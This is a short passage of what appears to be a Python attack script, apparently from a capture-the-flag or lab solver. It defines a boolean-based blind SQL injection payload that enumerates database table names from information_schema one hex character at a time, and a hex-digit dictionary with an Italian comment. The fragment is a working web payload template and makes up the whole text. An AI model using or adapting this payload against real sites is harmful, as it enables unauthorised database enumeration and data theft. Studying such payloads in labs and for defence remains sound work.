    payload = "?id=-1' OR NOT( NOT(id=3) OR NOT( (SELECT hex(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {0}, 1) LIKE '{1}%' ) ) OR '0"
    
    dictionary = '0123456789abcdef'  # Dizionario per i caratteri esadecimali (0-9, a-f)
